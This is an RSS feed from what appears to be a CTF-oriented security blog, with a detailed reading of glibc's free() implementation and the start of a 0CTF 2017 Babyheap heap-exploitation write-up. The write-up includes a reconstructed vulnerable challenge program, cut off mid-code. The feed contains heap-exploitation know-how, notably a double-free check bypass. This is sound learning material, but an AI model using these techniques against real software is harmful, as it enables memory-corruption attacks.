<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Sun, 20 Aug 2017 09:32:09 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>malloc.c源码阅读之__libc_free</title>
      <link>http://0x48.pw/2017/08/07/0x37/</link>
      <guid>http://0x48.pw/2017/08/07/0x37/</guid>
      <pubDate>Mon, 07 Aug 2017 06:20:04 GMT</pubDate>
      <description>
      
        &lt;p&gt;学堆的最好方式还是读malloc.c的源码，所以有了这篇文章，目前计划的是分两篇，一篇是读&lt;code&gt;__libc_free&lt;/code&gt;函数，一篇是读&lt;code&gt;__libc_malloc&lt;/code&gt;函数，本篇是读&lt;code&gt;free&lt;/code&gt;函数的源码。之后有空可能还会写&lt;code&gt;calloc&lt;/code&gt;或者&lt;code&gt;realloc&lt;/code&gt;&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>学堆的最好方式还是读malloc.c的源码，所以有了这篇文章，目前计划的是分两篇，一篇是读<code>__libc_free</code>函数，一篇是读<code>__libc_malloc</code>函数，本篇是读<code>free</code>函数的源码。之后有空可能还会写<code>calloc</code>或者<code>realloc</code></p>
<a id="more"></a>
<p>读代码使用的是<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a></p>
<p>PS: 默认研究64位</p>
<p>首先是我画的总的流程图，顺着流程图来</p>
<p><img src="http://qn.lazysheep.cc/img/free1.png" alt="free1"></p>
<h2 id="libc-free-void-mem"><a href="#libc-free-void-mem" class="headerlink" title="__libc_free(void *mem)"></a>__libc_free(void *mem)</h2><p><code>free</code>在malloc.c中定义在<code>__libc_free</code>函数中，只有一个参数<code>void *mem</code>，需要free的地址。</p>
<p>首先是检查<code>__free_hook</code>，在<code>main_arena</code>前面有个地方是储存<code>malloc_hook</code>和<code>free_hook</code>的地方(0CTF 2017 Babyheap中有涉及)，如果该值不为NULL(0)，则把<code>mem</code>当做参数，执行<code>free_hook</code>，执行结束后直接return，就不执行<code>free</code>的后续代码了</p>
<p>如果不存在<code>free_hook</code>，这一步是检查<code>mem == 0</code>，如果true，则直接return</p>
<p>如果false，则根据mem对p进行赋值，mem指向的是chunk中储存数据的地方，p是指向chunk header的地方。比如32位系统，<code>p = mem-8</code>，64位系统则是<code>p=mem-16</code></p>
<p>然后根据chunk size的第二个标志位来判断该地址空间是否是由mmap分配的，如果true，也就是标志位为1，则执行一系列操作(暂不研究mmap相关的操作，先研究brk)，然后执行<code>munmap_chunk(p)</code>，然后执行return</p>
<p>如果标志位为0(false)，则根据第三个(最高位)标志位判断该chunk是否不属于<code>main_arena</code>，如果标志位为0，表示属于，则把<code>main_arena</code>的地址赋值给<code>ar_ptr</code></p>
<p>接下来把<code>ar_ptr</code>和<code>p</code>当做参数，去执行<code>_int_free</code>函数：<code>_int_free(ar_ptr, p, 0)</code></p>
<h2 id="int-free-mstate-av-mchunkptr-p-int-have-lock"><a href="#int-free-mstate-av-mchunkptr-p-int-have-lock" class="headerlink" title="_int_free(mstate av, mchunkptr p, int have_lock)"></a>_int_free(mstate av, mchunkptr p, int have_lock)</h2><p>这里提一下，参数中的mstate表示的是<code>malloc_state</code>结构体也就是<code>main_arena</code>的结构体，<code>mchunkptr</code>表示的是<code>malloc_chunk</code>的结构体（PS：如果结构体还不知道，就别来学堆了）</p>
<p>在写blog的过程中发现了一个别人做的流程图，而且做的挺不错了，所以我就懒得自己画了，而且画的挺全的，之后的malloc的流程图也直接用这个了：</p>
<p><img src="http://qn.lazysheep.cc/img/heap.png" alt="free2"></p>
<h3 id="未区分bin之前"><a href="#未区分bin之前" class="headerlink" title="未区分bin之前"></a>未区分bin之前</h3><p>在未通过size来判断该chunk free之后是处于哪个bin之前，有进行一些通用检测，代码不长，也挺简单的。</p>
<ol>
<li>get chunksize，通过p-&gt;mchunksize，去掉标志位后获取chunk的size</li>
<li>检查p的合法性</li>
<li>检查size的合法性</li>
</ol>
<p>####检查p的合法性</p>
<p>有两个判断，一个是需要<code>p &lt; (-size)</code>，比如在64位系统中，地址最大是8byte的，如果<code>p &gt; (-size)</code>，那么<code>p + size</code>就超出了合法的地址空间。还有一个检查是对齐的问题，比如64位系统是0x10对齐，所以一个合法的地址都是0x10的倍数，如果<code>p &amp; 0xf != 0</code>就表示p不是16的倍数，则不是一个合法的地址。</p>
<p>总结下，如果<code>p &gt; (-size) || (p&amp;0xf)</code>为true ，判断出属于非法地址则报错(<code>free(): invalid pointer</code>)退出(报错具体的操作暂时不想详细研究)。</p>
<h4 id="检查size的合法性"><a href="#检查size的合法性" class="headerlink" title="检查size的合法性"></a>检查size的合法性</h4><p>检查完地址的合法性后就是检查size的合法性，一个是大小问题，首先要<code>size &gt;= MINSIZE</code>，然后因为地址已经是0x10对齐了，所以去掉标志位的size也应该要是0x10的倍数，<code>size &amp; 0xf == 0</code>，其实我觉得这个检查没必要，因为size赋值的时候已经把标志位清零了，然后这期间也没有size的赋值操作了。</p>
<p>总结下，如果<code>size &lt; MINSIZE || size&amp;0xf</code>为true，则表示无效的size，报错(<code>free(): invalid size</code>)退出。</p>
<h3 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h3><p>在进行chunk的一些简单的check之后，就是进入各个bin的分支了，首先是fastbin分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</div></pre></td></tr></table></figure>
<p>如果size小于等于fastbin的最大size，则进入fastbin分支。大致流程如下：</p>
<ol>
<li>下一个chunk的size要大于2*SIZE_SZ</li>
<li>下一个chunk的size要小于arena-&gt;system_mem</li>
<li>arena-&gt;flags最后一bit清零</li>
<li>根据size获取该chunk该放进哪个fastbin</li>
<li>fastbin中原本的值不能等于当前chunk的地址</li>
<li>如果fastbin不为空，获取size对应的index</li>
<li>chunk的fd赋值为fastbin的值</li>
<li>fastbin赋值为当前chunk的地址</li>
<li>fastbin entry判断</li>
</ol>
<p>fastbin的流程很简单，大致就上面9个步骤</p>
<h4 id="next-chunk-size-check"><a href="#next-chunk-size-check" class="headerlink" title="next chunk size check"></a>next chunk size check</h4><p>通过当前chunk的地址加上size，就可以得到下一个chunk。然后获取到下一个chunk的size，对其上下限进行判断，需要大于0x10，小于heap的总size</p>
<p>检查完以后，下面执行了两个函数，一个是<code>free_perturb</code>，目的是对chunk的data块通过memset赋值，但是默认情况下是不进行操作。也就是说，我们可以通过设置，把free后的chunk的data区域赋值，但是不能赋值成<code>\x00</code></p>
<p>然后是<code>set_fastchunks</code>，作用是对arena的flags标志位的最低bit清零</p>
<h4 id="判断fastbin大小"><a href="#判断fastbin大小" class="headerlink" title="判断fastbin大小"></a>判断fastbin大小</h4><p>之前我写个fastbin专题的博客，如果有基础的就知道，fastbin其实是一个长度为10的数组fastbinsY</p>
<p>index从0，1，2……开始长度是0x20，0x30，0x40……(放不满的问题之前博客中说过)</p>
<p>所以首先是根据size获取到index，具体的运算是<code>(size &gt;&gt; 4) - 2</code>，  </p>
<p>然后根据index从fastbinY中取地址和取值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fd = &amp;fastbinsY[index];</div><div class="line">old = *fd;</div></pre></td></tr></table></figure>
<h4 id="2free-check"><a href="#2free-check" class="headerlink" title="2free check"></a>2free check</h4><p>fastbin中也有一个简单的对2free的check，如果<code>old == p</code>，则报2free的error(<code>double free or corruption(fasttop)</code>)</p>
<p>逻辑很简单，old是在fastbin中的值，表示已经被free过，如果再free就是2free了</p>
<p>要bypass也很简单：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">free</span>(a)</div><div class="line"><span class="built_in">free</span>(b)</div><div class="line"><span class="built_in">free</span>(a)</div></pre></td></tr></table></figure>
<h4 id="单链表插入"><a href="#单链表插入" class="headerlink" title="单链表插入"></a>单链表插入</h4><p>fastbin是一个单向链表，所以下面就是单链表插入操作，逻辑也挺简单的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p-&gt;fd = old</div><div class="line">fastbinsY[index] = p</div></pre></td></tr></table></figure>
<p>PS: 实际代码这里很迷，是一个循环，但是我觉得是循环不起来的</p>
<h4 id="fastbin-entry-check"><a href="#fastbin-entry-check" class="headerlink" title="fastbin entry check"></a>fastbin entry check</h4><p>最后是对fastbin entry进行检查，在单链表插入操作之前还有一个操作，如果<code>old!=NULL</code>，也就是说当前index的fastbin如果不是空链表，我们就要获取原本fastbinsY[index]的index，具体操作是<code>old_index = (old-&gt;chunksize &gt;&gt; 4) - 2</code>，最后再对两个index进行判断，如果<code>index != old_index</code>，则表示两个index不同的chunk竟然放在同一个链表中，肯定有问题啊，然后报错退出(<code>invalid fastbin entry (free)</code>)</p>
<p>如果是free一个fastbin chunk的话，执行完上面的逻辑，free函数就可以return了，我们可以看到fastbin的free过程只做了一些简单的判断，然后只进行了单链表操作，对于inuse标志位却没有处理</p>
<p>PS: 这之中还有一些的多线程情况下lock的问题，暂不研究</p>
<h3 id="非fastbin的情况"><a href="#非fastbin的情况" class="headerlink" title="非fastbin的情况"></a>非fastbin的情况</h3><p>对smallbin, largenbin, unsortbin的操作都在这个分支中，基本流程如下：</p>
<ol>
<li>判断是否是使用mmap分配的内存空间</li>
<li>获取下一个chunk的地址</li>
<li>进行3个double free check</li>
<li>获取下一个chunk的size，并对其进行check</li>
<li>调用free_perturb函数，上面讲过</li>
<li>前置合并操作，逻辑如下：<ol>
<li>上一个chunk处于空闲状态</li>
<li>获取上一个chunk的size，并加到当前chunk的size中去</li>
<li>获取上一个chunk的地址</li>
<li>unlink上一个chunk</li>
</ol>
</li>
<li>判断下一个chunk是否是top chunk，如果是见下面流程，不是，跳到8<ol>
<li>当前size加上下一个chunk的size</li>
<li>把加好后的size赋值给当前chunk的size</li>
<li>arena执行top chunk的指针改指向当前chunk</li>
</ol>
</li>
<li>判断下一个chunk是否是空闲状态，如果是见下面流程，如果不是，跳到9<ol>
<li>unlink下一个chunk</li>
<li>当前size加上下一个chunk的size</li>
</ol>
</li>
<li>清除下一个chunk的inuse标志位</li>
<li>获取unsortbin地址</li>
<li>获取unsortbin-&gt;fd地址</li>
<li>进行unsort chunk check</li>
<li>当前chunk-&gt;fd = unsortbin-&gt;fd</li>
<li>当前chunk-&gt;bk = unsortbin</li>
<li>如果当前chunk不是smallbin，把fd_nextsize/bk_nextsize清零</li>
<li>unsortbin-&gt;fd-&gt;bk = 当前chunk</li>
<li>unsortbin-&gt;fd = 当前chunk</li>
<li>设置当前chunk的size，inuse标志位为1，设置下一个chunk的pre_size</li>
<li>如果size&gt;65536则…….</li>
</ol>
<h4 id="double-free-check"><a href="#double-free-check" class="headerlink" title="double free check"></a>double free check</h4><p>共有三个check，首先是当前chunk不能是top chunk，也就是top chunk不能被free，第二个check是检查下一个chunk的地址不能大于top chunk的地址加上top chunk的size，因为在brk分配得到的一个堆中，top chunk是末尾的chunk，所以top chunk之后是不存在其他chunk的，第三个是检查下一个chunk的inuse标志位，只有当前chunk是inuse状态，才能被free。</p>
<p>之后是对下一个chunk的size进行check，也就是上下限检查。</p>
<h4 id="前向合并操作"><a href="#前向合并操作" class="headerlink" title="前向合并操作"></a>前向合并操作</h4><p>如果上一个chunk是处于空闲状态，当前chunk就要和上一个chunk进行合并。逻辑也很简单，因为上一次chunk是处于空闲状态，所以当前chunk的pre_size可以获取到上一个chunk的size，和当前chunk的size相加，形成新的size，当前chunk的地址减去pre_size，获得上一个chunk的地址，而上一个chunk的地址将赋值给当前chunk。然后对上一个chunk进行unlink操作，把上一个chunk从bin的链表中删除。</p>
<h4 id="向后合并操作"><a href="#向后合并操作" class="headerlink" title="向后合并操作"></a>向后合并操作</h4><p>向后合并操作有两种情况，一种是下一chunk是处于空闲状态的chunk，另一种是下一个chunk是top chunk。如果下一个chunk是top chunk，首先获取到下一个chunk的size加上当前chunk的size形成新的size，并储存到当前chunk的size位，然后把arena的top chunk指针设置成当前chunk的地址，这样就完成了把当前chunk合并进top chunk的操作。</p>
<p>可以通过下下个chunk的inuse标志位判断下一个chunk是否处于空闲状态，如果处于inuse状态，这把下一个chunk的inuse标志位置零，表示当前chunk处于空闲状态，如果下一个chunk处于空闲状态，则需要进行向后合并操作。首先是unlink下一个chunk，把下一个chunk从bin的链表中删去，然后当前size加上下一个chunk的size。</p>
<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><p>首先是获取下一个chunk的pre_size，和当前chunk的size进行比较，因为传入unlink的chunk都是处于空闲状态，所以下一个chunk的pre_size位是有效值。之后是进行一个比较经典的check：<code>P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</code>，当该check通过后就是删除当前链表的操作了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd = FD</div><div class="line">P-&gt;bk = BK</div></pre></td></tr></table></figure>
<p>这些都算是链表中比较经典的操作了。</p>
<p>然后是，如果当前chunk是largebin，还会对<code>fd_nextsize</code>和<code>bk_nextsize</code>进行一些操作。这两个也是指针变量，但是在free函数中基本没有对这两个指针进行操作赋值，所以还不清楚具体含义，等看完malloc函数再进行研究。</p>
<h4 id="把当前chunk加入到unsortbin中"><a href="#把当前chunk加入到unsortbin中" class="headerlink" title="把当前chunk加入到unsortbin中"></a>把当前chunk加入到unsortbin中</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="number">1678</span>	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">1679	&#123;</div><div class="line"><span class="number">1680</span>	  <span class="comment">/* Serialize access.  */</span></div><div class="line"><span class="number">1681</span>	  __libc_lock_define (, mutex);</div><div class="line"><span class="number">1682</span>	</div><div class="line"><span class="number">1683</span>	  <span class="comment">/* Flags (formerly in max_fast).  */</span></div><div class="line"><span class="number">1684</span>	  <span class="keyword">int</span> flags;</div><div class="line"><span class="number">1685</span>	</div><div class="line"><span class="number">1686</span>	  <span class="comment">/* Fastbins */</span></div><div class="line"><span class="number">1687</span>	  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line"><span class="number">1688</span>	</div><div class="line"><span class="number">1689</span>	  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></div><div class="line"><span class="number">1690</span>	  mchunkptr top;</div><div class="line"><span class="number">1691</span>	</div><div class="line"><span class="number">1692</span>	  <span class="comment">/* The remainder from the most recent split of a small request */</span></div><div class="line"><span class="number">1693</span>	  mchunkptr last_remainder;</div><div class="line"><span class="number">1694</span>	</div><div class="line"><span class="number">1695</span>	  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line"><span class="number">1696</span>	  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</div><div class="line"><span class="number">1697</span>	</div><div class="line"><span class="number">1698</span>	  <span class="comment">/* Bitmap of bins */</span></div><div class="line"><span class="number">1699</span>	  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</div><div class="line"><span class="number">1700</span>	</div><div class="line"><span class="number">1701</span>	  <span class="comment">/* Linked list */</span></div><div class="line"><span class="number">1702</span>	  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></div><div class="line"><span class="number">1703</span>	</div><div class="line"><span class="number">1704</span>	  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></div><div class="line">1705	     by free_list_lock in arena.c.  */</div><div class="line"><span class="number">1706</span>	  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></div><div class="line"><span class="number">1707</span>	</div><div class="line"><span class="number">1708</span>	  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></div><div class="line">1709	     the free list.  Access to this field is serialized by</div><div class="line">1710	     free_list_lock in arena.c.  */</div><div class="line"><span class="number">1711</span>	  INTERNAL_SIZE_T attached_threads;</div><div class="line"><span class="number">1712</span>	</div><div class="line"><span class="number">1713</span>	  <span class="comment">/* Memory allocated from the system in this arena.  */</span></div><div class="line"><span class="number">1714</span>	  INTERNAL_SIZE_T system_mem;</div><div class="line"><span class="number">1715</span>	  INTERNAL_SIZE_T max_system_mem;</div><div class="line"><span class="number">1716</span>	&#125;;</div></pre></td></tr></table></figure>
<p>这是arena的结构体，其中fastbinsY数组存放的是fastbin，而bins数组中存放的是unsortbin，smallbin和largebin，其中bins[0]和bins[1]存放的是unsortbin。</p>
<p>在free函数中，free一个chunk，是把他放入到unsortbin之中。源代码中是这样的两句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">4333</span>	      bck = unsorted_chunks(av);</div><div class="line"><span class="number">4334</span>	      fwd = bck-&gt;fd;</div></pre></td></tr></table></figure>
<p>链表插入的操作:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">4340</span>	      p-&gt;fd = fwd;</div><div class="line"><span class="number">4341</span>	      p-&gt;bk = bck;</div><div class="line">......</div><div class="line"><span class="number">4347</span>	      bck-&gt;fd = p;</div><div class="line"><span class="number">4348</span>	      fwd-&gt;bk = p;</div></pre></td></tr></table></figure>
<p>其中，bck的值为arena中top chunk的地址，fwd是bins[0]的值，arena的结构如下，</p>
<table>
<thead>
<tr>
<th style="text-align:center">top chunk</th>
<th style="text-align:center">last_remainder</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">bins[0]</td>
<td style="text-align:center">bins[1]</td>
</tr>
</tbody>
</table>
<p>上面这样的结构形成一个chunk和当前chunk形成一个双向循环链表</p>
<p>当largenbin的情况，会吧<code>fd_nextsize</code>和<code>bk_nextsize</code>置空(NULL)</p>
<p>最后就是设置当前chunk的inuse标志位和更新size，并设置下一个chunk的pre_size</p>
<p>所以chunk在进行free操作后，如果存在上一个chunk，肯定是处于inuse状态，如果不是上面就和当前chunk合并了，同理下一个也肯定是处于inuse状态的chunk</p>
<p>最后，当<code>size&gt;65536</code>时还会有一波猜测，大致过了一遍，是处理arena的，所以暂不做研究.</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次看free代码虽然花了挺长时间，但是其实代码挺简单的，主要是三天打鱼两天晒网的缘故。最难看懂的代码应该是内联汇编了，比如这句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">4255</span>	    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</div></pre></td></tr></table></figure>
<p>看了半天这内联汇编实在是难看，也不好理解，最后我把自己电脑上的libc.so，丢到ida中，找到这句对应的汇编，就好理解多了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmpxchg [rdx], rbx</div></pre></td></tr></table></figure>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/08/07/0x37/#disqus_thread</comments>
    </item>
    
    <item>
      <title>堆溢出学习之0CTF 2017 Babyheap</title>
      <link>http://0x48.pw/2017/08/01/0x36/</link>
      <guid>http://0x48.pw/2017/08/01/0x36/</guid>
      <pubDate>Tue, 01 Aug 2017 14:12:10 GMT</pubDate>
      <description>
      
        &lt;p&gt;最近在学习堆, 看了&lt;a href=&quot;https://github.com/shellphish/how2heap&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;how2heap&lt;/a&gt;上的&lt;code&gt;fastbin_dup&lt;/code&gt;，例子都还挺简单的，然后学做了下0CTF 2017的Babyheap，然后开启了新大陆，发现我以前根本就不会Pwn……&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>最近在学习堆, 看了<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>上的<code>fastbin_dup</code>，例子都还挺简单的，然后学做了下0CTF 2017的Babyheap，然后开启了新大陆，发现我以前根本就不会Pwn……</p>
<a id="more"></a>
<h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><p>先说下how2heap上的例子，一个是<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="external">fastbin_dup.c</a>还有一个是<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">fastbin_dup_into_stack</a></p>
<p>其实这两个例子挺简单的，看懂我上一篇讲fastbin的blog，对着代码看看应该很容易理解，第一个其实就是演示下fastbin的2free，第二个是演示利用fastbin的2free，malloc出一个特定的地址，很简单的，其实就是通过修改fastbin的fd，太简单了就不多讲了…</p>
<h1 id="Babyheap"><a href="#Babyheap" class="headerlink" title="Babyheap"></a>Babyheap</h1><p>题目我github上有: <a href="https://github.com/Hcamael/CTF_repo/tree/master/0CTF%202017/Pwn10(Baby%20Heap%202017)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/0CTF%202017/Pwn10(Baby%20Heap%202017)</a></p>
<p>这题是有个libc库的，这题的难点在哪？我觉得就是开了PIE保护，地址随机化，之前我blog中做的那些题我们是可以知道bin中的地址的，比如<code>got</code>表，<code>plt</code>表啊，<code>.bss</code>或者<code>.data</code>里啥变量的地址啊，那都是在没开PIE的情况，当开了PIE，任何地址我们都是未知的。</p>
<p>还有一个难点就是调试不好调试(我最近从peda换成了pwndbg)，有两个难点，首先是有个alarm，每次调试的时候都要跳过执行这个函数，要不然就在bin中patch掉这个函数，还有个应该是因为PIE的原因，调用一个函数的时候pwndbg没办法帮我显示函数命了，害我还要去查这个函数是malloc还是free。这两个太影响我调试的进度了，所以我根据bin复现了一个逻辑相同的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">list</span>[<span class="number">16</span>*<span class="number">3</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"1. Allocate"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"2. Fill"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"3. Free"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"4. Dump"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"5. Exit"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Command: "</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_str</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> tmp, x, r;</div><div class="line">    <span class="keyword">char</span> buf;</div><div class="line">    <span class="keyword">if</span> (len)&#123;</div><div class="line">        tmp = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span>(len<span class="number">-1</span> &gt; tmp)&#123;</div><div class="line">            x = read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>);</div><div class="line">            <span class="keyword">if</span> (x&gt;<span class="number">0</span>)&#123;</div><div class="line">                <span class="keyword">if</span>(buf==<span class="number">10</span>)</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                *(s+tmp) = buf;</div><div class="line">                tmp++;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        *(s+tmp) = <span class="number">0</span>;</div><div class="line">        r = tmp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        r = <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">read_int</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> s[<span class="number">8</span>];</div><div class="line">    read_str(&amp;s, <span class="number">8</span>);</div><div class="line">    <span class="keyword">return</span> atol(s);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">alloca_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">char</span> *add;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=<span class="number">15</span>; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> 